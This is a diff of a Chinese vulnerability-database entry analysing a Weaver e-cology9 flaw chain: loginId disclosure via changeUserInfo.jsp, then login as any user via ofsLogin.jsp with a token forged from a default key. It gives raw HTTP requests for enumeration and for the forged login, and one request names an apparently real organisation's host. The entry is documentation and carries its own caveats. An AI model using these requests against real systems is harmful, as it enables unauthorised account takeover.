@@ -1,11 +1,51 @@
 ---
-version: "select * from ofs_sendinfo;"
 source: "MrWQ/vulnerability-paper"
+title: "泛微e-cology9 changeUserInfo信息泄露+ofsLogin默认密钥登录链"
+product: "泛微e-cology9"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "补丁<10.57.2；测试9.00.2206.02有文件，早期样本无；中间版本未确认；需默认/已知secretkey及有效HrmResource记录"
+prerequisites: "未认证枚举后伪造用户token；不是任意管理员保证"
+side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/FtDYKhKlCC8pCshM6Q-1AA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20e-cology9%20changeUserInfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%8F%8A%20ofsLogin%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md"
+id: "vw-9dce770915be801e77fd2ee6"
+entity_id: "ve-9dce770915be801e77fd2ee6"
+schema_version: "1"
 ---
 
-# 泛微 e-cology9 changeUserInfo 信息泄漏及 ofsLogin 任意用户登录漏洞分析
+# 泛微e-cology9 changeUserInfo信息泄露+ofsLogin默认密钥登录链
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：泛微e-cology9；changeUserInfo信息泄露+ofsLogin默认密钥登录链
+- 版本、配置及部署条件：补丁<10.57.2；测试9.00.2206.02有文件，早期样本无；中间版本未确认；需默认/已知secretkey及有效HrmResource记录
+- 认证与权限前提：未认证枚举后伪造用户token；不是任意管理员保证
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 完整长篇含两个独立漏洞及多种信息泄漏分支，应多实体链表示
+- status分支解说声称HrmResourceManager存在则code21，与所列代码不符：manager存在不进分支，默认仍-1；21依赖普通用户强制改密逻辑
+- ofsLogin请求×tamp是&timestamp转码损坏；getUserId代码结尾截断；补丁URL断行
+- 版本不存在文件仅实测样本，不能推及所有之前版本；作者明确中间版本未知应保留
+- 登录依赖已存在且status<4用户、hrmtransrule映射和secretkey；合并时务必保留这些条件
+
+## 操作风险
+
+请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FtDYKhKlCC8pCshM6Q-1AA)
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRGPiboDKmcUcLldqjKXM3iatAQ8vicRic4vV0haNBlVqReSfLhx8F5iage2jiamJWbfX3w6Cefoe4Op6BEYUfbFjywwX/640?wx_fmt=svg)
@@ -57,7 +97,7 @@ source: "MrWQ/vulnerability-paper"
 
 漏洞分析
 
-### **补丁包分析**
+#### **补丁包分析**
 
 2023 年 04 月 18 日，泛微首次发布 v10.57 版本补丁包，同年 05 月 15 日又发布 v10.57.2 版本补丁包，通过如下两条链接分别下载两个版本的补丁包。
 
@@ -132,7 +172,7 @@ if (path.contains("/mobile/") && path.contains("/plugin/") && path.contains("/ch
 
 那么，接下来对如上两个文件做进一步分析。
 
-### **任意用户登录分析**
+#### **任意用户登录分析**
 
 首先先进入 `mobile/plugin/1/ofsLogin.jsp`文件，如下图所示。
 
@@ -283,7 +323,7 @@ rs.executeQuery("select * from HrmResource where loginid = ? and status < 4 ", r
 
 那么现在 `HrmResource`表不为空，只要当 `receiver`变量值为 `"user1"`，便能够对应上 `HrmResource`表中的 `loginid`字段的值，最终就能够成功地实现任意用户登录。
 
-### **信息泄漏分析**
+#### **信息泄漏分析**
 
 通过如上的任意用户登录漏洞分析，可以明白该漏洞的利用条件是，需要已知一个存在于 `HrmResource`表中的 `loginid`。接下来来看 `/mobile/plugin/changeUserInfo.jsp`文件以做进一步的 `loginid`信息泄漏漏洞分析。
 
@@ -320,7 +360,7 @@ if ("getLoginid".equalsIgnoreCase(type)){
 
 查询时使用了 `%`，可以模糊匹配 `mobile`，当查询出的结果条数为 0 时，返回 `{"status":"-1"}`。
 
-```
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1234 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -336,7 +376,7 @@ Cache-Control: private
 X-Frame-Options: SAMEORIGIN
 X-XSS-Protection: 1
 X-UA-Compatible: IE=8
-Set-Cookie: ecology_JSessionid=aaa18FCpyjT4M7qjA1VCy; path=/
+Set-Cookie: ecology_JSessionid=a*******************y; path=/
 Content-Type: application/json; charset=UTF-8
 Content-Length: 17
 Connection: close
@@ -347,7 +387,7 @@ Date: Fri, 19 May 2023 01:41:30 GMT
 
 当大于 1 时返回 `{"status":"0"}`，如下。
 
-```
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
 Host: 
 Accept-Encoding: gzip, deflate
@@ -366,7 +406,7 @@ Cache-Control: private
 X-Frame-Options: SAMEORIGIN
 X-XSS-Protection: 1
 X-UA-Compatible: IE=8
-Set-Cookie: ecology_JSessionid=aaazz3rlfOPGyh_GFNZly; path=/
+Set-Cookie: ecology_JSessionid=a*******************y; path=/
 Content-Type: application/json; charset=UTF-8
 Content-Length: 16
 Connection: close
@@ -383,7 +423,7 @@ Date: Fri, 19 May 2023 01:42:50 GMT
 
 当等于 1 时返回 `{"status":"1"}`以及 `loginId`及其值，在这种情况下，我们就可以直接获取一个 `loginId`。
 
-```
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -404,7 +444,7 @@ X-Frame-Options: SAMEORIGIN
 X-XSS-Protection: 1
 X-UA-Compatible: IE=8
 Expires: Thu, 01 Dec 1994 16:00:00 GMT
-Set-Cookie: ecology_JSessionid=aaxctkRR1WUJ97SAqRRiy; path=/
+Set-Cookie: ecology_JSessionid=a*******************y; path=/
 {"loginId":"xsijr","status":"1"}
 
 ```
@@ -510,7 +550,7 @@ public JSONObject getPassChangedReminder(String var1) {
 
 那么根据这个差异便可以用来爆破 `loginId`，如下图。
 
-```
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=status&loginId=user HTTP/1.1
 Host: weoa.sundan.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -578,8 +618,8 @@ public int getUserId(String var1) {
 
 然后作如下请求，便能成功进入系统后台 `/wui/index.html`页面。
 
-```
-GET /mobile/plugin/1/ofsLogin.jsp?syscode=1×tamp=1&gopage=/wui/index.html&receiver=user1&loginTokenFromThird=793527b3f4855296c85629a7271e20e7 HTTP/1.1
+```http
+GET /mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=user1&loginTokenFromThird=793527b3f4855296c85629a7271e20e7 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept-Encoding: gzip, deflate
